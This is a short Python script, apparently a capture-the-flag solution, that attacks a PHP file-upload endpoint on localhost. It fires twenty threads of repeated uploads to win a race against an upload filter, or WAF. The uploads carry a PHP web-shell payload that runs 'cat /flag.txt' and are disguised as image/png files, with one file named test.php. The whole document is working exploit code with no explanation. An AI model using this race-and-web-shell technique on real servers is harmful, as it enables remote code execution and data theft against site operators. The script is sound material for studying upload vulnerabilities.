import requests 
from threading import Thread
import time 
url = "http://localhost:8000"

s = requests.session() 
s.cookies.set("PHPSESSID", "i4ihb35jga9kg7up8vkeo5qjg8",domain="localhost:8000")

def go1():
    for _ in range(1000):
        r = s.post(
            f"{url}",
            files={
                "file" : ("asdf", "<?= system('cat /flag.txt'); ?>", "image/png")
            }
        )
        time.sleep(0.1)
        # print(r.text)
def go2(): 
    for _ in range(1000):
        r = s.post(
            f"{url}",
            files={
                "file" : ("test.php", "<?= system('cat /flag.txt'); ?>", "image/png")
            }
        )
        
        if not "WAF XD" in r.text:
            print(r.text) 

threads = [ ]
for _ in range(10): 
    thr = Thread(target=go1)
    threads.append(thr) 
     
for _ in range(10):
    thr = Thread(target=go2)
    threads.append(thr)

try:
    for thr in threads: 
        thr.start()
except Exception as e :
    for thr in threads:
        thr.join()
